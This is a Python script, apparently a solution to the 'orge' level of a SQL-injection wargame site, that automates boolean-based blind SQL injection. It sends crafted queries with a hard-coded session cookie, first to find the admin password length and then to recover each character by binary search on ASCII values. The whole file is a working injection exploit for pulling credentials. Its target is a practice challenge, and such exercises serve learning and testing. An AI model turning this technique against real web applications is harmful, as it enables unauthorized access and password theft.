import http.client

headers={'Cookie':'PHPSESSID=pdrq9erdrfaks5stqsi3mfj1p1',
         'Content-Type':'application/x-www-form-urlencoded'}
#cookie 세팅
conn=http.client.HTTPSConnection("los.eagle-jump.org")
#los url 세팅

key="Hello admin"
#set key ward

query=''
result=""


print ("start")


for i in range(1,30):
    print("length : ", i)
    query ='/orge_40d2b61f694f72448be9c97d1cea2480.php'
    query +="?pw=1%27%7c%7cid=%27admin%27%20%26%26%20"
    query += "length(pw)="+str(i)+"%20--+"
    conn.request('GET',query,'',headers)
    data=conn.getresponse().read().decode("utf-8")
    
    if data.find(key) > 0:
        print ("key length :", i)
        length = i
        break



for i in range(1, length+1):
    low = 1
    high = 128
    while low <= high:
        if low == high:
            result += chr(low)
            print("pw find : ", str(i))
            break
        
        mid = (low + high) // 2
        print("mid : ", mid)
        query ='/orge_40d2b61f694f72448be9c97d1cea2480.php'
        query +="?pw=1'%7c%7cid='admin'%20%26%26%20"
        query += "ascii(substr(pw,"+str(i)+",1))>"+str(mid)+"--+"
        conn.request('GET',query,'',headers)
        data=conn.getresponse().read().decode("utf-8")
        
        if data.find(key) > 0:
            low = mid+1
        else:
            high = mid
        
            

            
print (result)
